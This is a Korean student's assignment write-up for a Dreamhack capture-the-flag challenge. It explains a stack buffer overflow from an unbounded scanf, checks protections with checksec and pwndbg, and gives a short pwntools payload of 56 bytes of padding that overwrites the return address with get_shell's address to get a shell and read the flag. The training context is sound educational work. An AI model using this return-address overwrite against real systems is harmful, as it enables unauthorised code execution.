## 시스템 보안 과제(7주차)

## 풀이 과정
0. 문제 다운로드 및 서버 연결
<img width="1212" height="503" alt="Image" src="https://github.com/user-attachments/assets/3f32ab3c-0d46-48f4-bbf1-93ad179d0e51" />
-firebox브라우저에서 드림핵에 접속
-문제 파일 다운로드 및 vm 생성
*vm -> 잇스플로잇코드에 연결 시 사용 

1. 취약점 분석
<img width="294" height="100" alt="Image" src="https://github.com/user-attachments/assets/94f90c41-8058-49c5-b8f6-c21e180921df" />
-scanf("%s", buf) => 해당 코드는 입력 길이를 제한하지 않아, 버퍼 오버플로우를 발생시킬 가능성 존재 
<img width="912" height="196" alt="Image" src="https://github.com/user-attachments/assets/09ba4f33-a608-4394-8484-6a715e504db8" />
-취약점 확인

2. 보호기법 확인
<img width="866" height="575" alt="Image" src="https://github.com/user-attachments/assets/db711088-d5ac-4402-a577-0b1538fc22c5" />
-'gdb ./rao' : pwndbg에서 파일 분석 가능
<img width="838" height="232" alt="Image" src="https://github.com/user-attachments/assets/fd06f9b7-5546-4066-bfdd-1b0d8be13ec2" />
-'checksec'(보호기법 확인) : canary, pie가 모두 꺼져있음 -> 리턴 주소 덮어쓰는 공격 가능 
*canary: 오버플로우 탐지 기능/ pie: 주소 변경 기능 

3. pwndbg 분석
1)
<img width="858" height="550" alt="Image" src="https://github.com/user-attachments/assets/0096b04d-f113-441b-8ad0-3f555ac0d336" />
-'disas main' : 스택 구조 파악 
-'sub rsp, 0x30' : 스택에 0x30 공간 할당
-'lea rax, [rbp-0x30]' : buf의 시작 주소 -> rbp-0x30
-'ret' : main 종료 시 스택에서 리턴 주소를 꺼내 점프 , 이 주소를 get_shell로 덮어 쓰는 것이 목표 
2)b,r 로 브레이크 포인트 설정 후 실행
-'b *main +54' , 'r'
3)get_shell 주소 확인 
<img width="782" height="148" alt="Image" src="https://github.com/user-attachments/assets/ed49fade-9267-4050-be38-cbf1cebc63a7" />
-'p get_shell' : 주소 확인 -> get_shell의 주소는 '0x4006aa'

4. 잇스플로잇 코드 작성
<img width="934" height="432" alt="Image" src="https://github.com/user-attachments/assets/e9f38bba-a72b-497d-acfb-29515889600b" />
*이전에 파악한 정보: 오프셋-56바이트 / get_shell 주소-0x4006aa
-'gedit exploit.py' : 코드 작성을 위한 코드 
-'padding = b'A' * 0x30 + b'B' * 0x8'  : 56바이트 (buf 0x30 + saved RBP 0x8)
-'payload = padding + p64(0x4006aa)' : 리턴 주소를 get_shell로 교체

5. 플래그 획득 
<img width="890" height="454" alt="Image" src="https://github.com/user-attachments/assets/f72a9652-5f94-492c-9c93-6b45ae71056c" />
-'python3 exploit.py'
-파일 목록 확인 후 flag 파일로 플래그 얻기  